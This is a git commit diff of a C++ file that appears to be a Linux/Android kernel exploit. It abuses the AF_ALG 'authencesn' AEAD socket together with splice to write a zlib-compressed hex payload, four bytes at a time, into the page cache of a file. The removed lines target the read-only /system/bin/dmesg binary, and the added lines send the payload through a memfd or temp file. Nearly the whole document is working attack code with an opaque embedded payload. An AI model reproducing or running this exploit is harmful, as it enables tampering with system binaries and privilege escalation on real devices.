0188242cf6153ebbafe5aeded7a02d86cd901dd6
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-05-02 07:54:00 +0900

    Update authencesn_exact.cpp

--- authencesn_exact.cpp
+++ authencesn_exact.cpp
@@ -8,6 +8,7 @@
 #include <linux/if_alg.h>
 #include <sys/syscall.h>
 #include <zlib.h>
+#include <sys/mman.h>
 
 #ifndef SOL_ALG
 #define SOL_ALG 279
@@ -20,6 +21,10 @@
 #define ALG_SET_AEAD_ASSOCLEN 4
 #endif
 
+#ifndef MSG_SPLICE_PAGES
+#define MSG_SPLICE_PAGES 0x8000
+#endif
+
 static void hex2bin(const char *hex, unsigned char *out, size_t max_len) {
     size_t len = strlen(hex);
     if (len % 2) return;
@@ -27,7 +32,8 @@ static void hex2bin(const char *hex, unsigned char *out, size_t max_len) {
         sscanf(hex + 2*i, "%2hhx", &out[i]);
     }
 }
-static unsigned char* d(const char *hex, size_t *out_len) {
+
+static unsigned char* hex_to_bytes(const char *hex, size_t *out_len) {
     size_t hex_len = strlen(hex);
     *out_len = hex_len / 2;
     unsigned char *buf = (unsigned char*)malloc(*out_len);
@@ -36,130 +42,156 @@ static unsigned char* d(const char *hex, size_t *out_len) {
     return buf;
 }
 
-static void c(int f, int t, const unsigned char *c, size_t c_len) {
-    int a = socket(AF_ALG, SOCK_SEQPACKET, 0);
-    if (a < 0) { perror("socket"); return; }
+static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4) {
+    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (sock < 0) { perror("socket"); return; }
 
     struct sockaddr_alg sa = {
         .salg_family = AF_ALG,
         .salg_type = "aead",
         .salg_name = "authencesn(hmac(sha256),cbc(aes))"
     };
-    if (bind(a, (struct sockaddr*)&sa, sizeof(sa)) < 0) { perror("bind"); close(a); return; }
+    if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+        perror("bind");
+        close(sock);
+        return;
+    }
 
     int h = SOL_ALG;
 
     size_t key_len;
-    unsigned char *key_data = d("0800010000000010" "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", &key_len);
-    if (key_data) {
-        if (setsockopt(a, h, ALG_SET_KEY, key_data, key_len) < 0) perror("setsockopt KEY");
-        free(key_data);
+    unsigned char *key = hex_to_bytes(
+        "0800010000000010"
+        "0000000000000000000000000000000000000000000000000000000000000000"
+        "0000000000000000000000000000000000000000",
+        &key_len);
+    if (key) {
+        if (setsockopt(sock, h, ALG_SET_KEY, key, key_len) < 0)
+            perror("setsockopt KEY");
+        free(key);
     }
 
     int dummy = 0;
-    if (setsockopt(a, h, 5, &dummy, 4) < 0) perror("setsockopt 5");
+    if (setsockopt(sock, h, 5, &dummy, 4) < 0)
+        perror("setsockopt 5");
 
-    int u = accept(a, NULL, NULL);
-    if (u < 0) { perror("accept"); close(a); return; }
-
-    int o = t + 4;   
+    int conn = accept(sock, NULL, NULL);
+    if (conn < 0) {
+        perror("accept");
+        close(sock);
+        return;
+    }
 
     unsigned char send_buf[8];
     memcpy(send_buf, "AAAA", 4);
-    if (c_len >= 4) memcpy(send_buf+4, c, 4);
-    else memset(send_buf+4, 0, 4);
+    memcpy(send_buf + 4, chunk4, 4);
 
-    size_t i_len;
-    unsigned char *i_zero = d("00", &i_len);
+    struct iovec iov = { .iov_base = send_buf, .iov_len = 8 };
+    struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_flags = MSG_SPLICE_PAGES };
 
-    struct msghdr msg = {0};
-    struct cmsghdr *cmsg;
     char cmsg_buf[CMSG_SPACE(sizeof(__u32)) * 4];
-    struct iovec iov;
-    iov.iov_base = send_buf;
-    iov.iov_len = 8;
-    msg.msg_iov = &iov;
-    msg.msg_iovlen = 1;
     msg.msg_control = cmsg_buf;
     msg.msg_controllen = sizeof(cmsg_buf);
-    cmsg = CMSG_FIRSTHDR(&msg);
+
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
     cmsg->cmsg_level = h;
-    cmsg->cmsg_type = 3;
+    cmsg->cmsg_type = ALG_SET_OP;
     cmsg->cmsg_len = CMSG_LEN(4);
-    __u32 val = 0;
-    memcpy(CMSG_DATA(cmsg), &val, 4);
+    __u32 op = 0;
+    memcpy(CMSG_DATA(cmsg), &op, 4);
+
     cmsg = CMSG_NXTHDR(&msg, cmsg);
+
     cmsg->cmsg_level = h;
-    cmsg->cmsg_type = 2;
+    cmsg->cmsg_type = ALG_SET_IV;
     cmsg->cmsg_len = CMSG_LEN(20);
-    unsigned char iv_data[20];
-    iv_data[0] = 0x10;
-    memset(iv_data+1, 0, 19);
-    memcpy(CMSG_DATA(cmsg), iv_data, 20);
+    unsigned char iv[20] = {0x10, 0};
+    memcpy(CMSG_DATA(cmsg), iv, 20);
+
     cmsg = CMSG_NXTHDR(&msg, cmsg);
     cmsg->cmsg_level = h;
-    cmsg->cmsg_type = 4;
+    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
     cmsg->cmsg_len = CMSG_LEN(4);
-    unsigned char assoc_data[4] = {0x08, 0, 0, 0};
-    memcpy(CMSG_DATA(cmsg), assoc_data, 4);
+    __u32 assoclen = 8;
+    memcpy(CMSG_DATA(cmsg), &assoclen, 4);
 
-    
-    if (sendmsg(u, &msg, 0) < 0) perror("sendmsg");
+    if (sendmsg(conn, &msg, 0) < 0) {
+        perror("sendmsg");
+        close(conn);
+        close(sock);
+        return;
+    }
 
-  
+    size_t splice_len = offset + 4;
     int pipefd[2];
-    if (pipe(pipefd) < 0) { perror("pipe"); close(u); close(a); return; }
+    if (pipe(pipefd) < 0) {
+        perror("pipe");
+        close(conn);
+        close(sock);
+        return;
+    }
 
-  
-    ssize_t spliced = splice(f, NULL, pipefd[1], NULL, o, SPLICE_F_MOVE);
-    if (spliced != o) perror("splice f->pipe");
+    loff_t off = 0; 
+    ssize_t ret = splice(file_fd, &off, pipefd[1], NULL, splice_len, SPLICE_F_MOVE);
+    if (ret != (ssize_t)splice_len) {
+        perror("splice file->pipe");
+    }
 
-    spliced = splice(pipefd[0], NULL, u, NULL, o, SPLICE_F_MOVE);
-    if (spliced != o) perror("splice pipe->socket");
+    ret = splice(pipefd[0], NULL, conn, NULL, splice_len, SPLICE_F_MOVE);
+    if (ret != (ssize_t)splice_len) {
+        perror("splice pipe->socket");
+    }
 
     close(pipefd[0]);
     close(pipefd[1]);
-
     char recv_buf[8192];
-    ssize_t recv_len = recv(u, recv_buf, 8 + t, 0);
-    if (recv_len < 0) { /**/ }
+    recv(conn, recv_buf, sizeof(recv_buf), 0);
 
-    close(u);
-    close(a);
-    free(i_zero);
+    close(conn);
+    close(sock);
 }
 
 int main() {
-    int f = open("/system/bin/dmesg", O_RDONLY);
-    if (f < 0) { perror("open /system/bin/dmesg"); return 1; }
-
-    size_t compressed_len;
-    unsigned char *compressed = d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3", &compressed_len);
-    if (!compressed) return 1;
-
-    uLongf dest_len = 65536;
-    unsigned char *decompressed = (unsigned char*)malloc(dest_len);
-    if (!decompressed) { free(compressed); return 1; }
-
-    int ret = uncompress(decompressed, &dest_len, compressed, compressed_len);
-    if (ret != Z_OK) {
-        fprintf(stderr, "zlib decompress error: %d\n", ret);
-        free(compressed);
-        free(decompressed);
-        close(f);
+    const char *compressed_hex =
+        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";
+    size_t comp_len;
+    unsigned char *compressed = hex_to_bytes(compressed_hex, &comp_len);
+    if (!compressed) {
+        fprintf(stderr, "Failed to parse compressed hex\n");
         return 1;
     }
-    free(compressed);
 
-    unsigned char *e = decompressed;
-    size_t e_len = dest_len;
-
-
-    for (size_t i = 0; i + 4 <= e_len; i += 4) {
-        c(f, i, e + i, 4);
+    uLongf decomp_len = 65536;
+    unsigned char *decompressed = (unsigned char*)malloc(decomp_len);
+    if (!decompressed) {
+        free(compressed);
+        return 1;
     }
 
-    free(e);
-    close(f);
+    int ret = uncompress(decompressed, &decomp_len, compressed, comp_len);
+    free(compressed);
+    if (ret != Z_OK) {
+        fprintf(stderr, "zlib decompress error: %d\n", ret);
+        free(decompressed);
+        return 1;
+    }
+
+    int mem_fd = memfd_create("aead_payload", MFD_CLOEXEC);
+    if (mem_fd < 0) {
+        mem_fd = open("/tmp/aead_payload.tmp", O_RDWR | O_CREAT | O_TRUNC, 0600);
+        if (mem_fd < 0) {
+            perror("open /tmp/aead_payload.tmp");
+            free(decompressed);
+            return 1;
+        }
+    }
+    write(mem_fd, decompressed, decomp_len);
+    lseek(mem_fd, 0, SEEK_SET); 
+    for (size_t i = 0; i + 4 <= decomp_len; i += 4) {
+        trigger_aead(mem_fd, i, decompressed + i);
+    }
+
+    close(mem_fd);
+    free(decompressed);
     return 0;
 }
